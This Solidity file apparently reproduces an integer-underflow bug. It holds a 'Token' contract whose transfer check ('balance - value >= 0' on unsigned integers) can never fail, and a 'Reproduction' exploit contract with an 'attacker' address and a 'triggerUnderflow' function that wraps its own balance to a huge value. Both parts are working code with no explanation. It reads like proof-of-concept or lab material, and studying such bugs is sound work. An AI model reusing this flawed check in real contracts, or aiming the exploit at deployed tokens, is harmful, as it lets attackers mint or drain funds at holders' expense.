contract Token {
    mapping(address => uint) public balances;
    uint public totalSupply;

    constructor(uint _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract Reproduction {
    Token public vulnerableContract;
    address public attacker;

    constructor(address _vulnerableContract) {
        vulnerableContract = Token(_vulnerableContract);
        attacker = msg.sender;
    }

    function setup(uint _initialDeposit) public {
        vulnerableContract.transfer(address(this), _initialDeposit);
    }

    function triggerUnderflow(uint _amount) public {
        vulnerableContract.transfer(attacker, _amount);
    }
}